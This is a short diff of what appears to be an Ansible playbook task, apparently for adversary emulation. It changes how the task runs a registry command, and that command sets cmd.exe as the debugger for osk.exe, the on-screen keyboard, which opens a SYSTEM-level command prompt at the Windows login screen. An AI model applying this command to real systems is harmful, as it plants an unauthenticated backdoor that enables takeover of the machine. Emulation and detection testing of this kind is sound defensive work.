@@ -6,5 +6,5 @@
   tasks:
           - name: Attaches Command Prompt As Debugger To Process - osk
             tags: OSK
-            command: |
+            raw: |
             reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
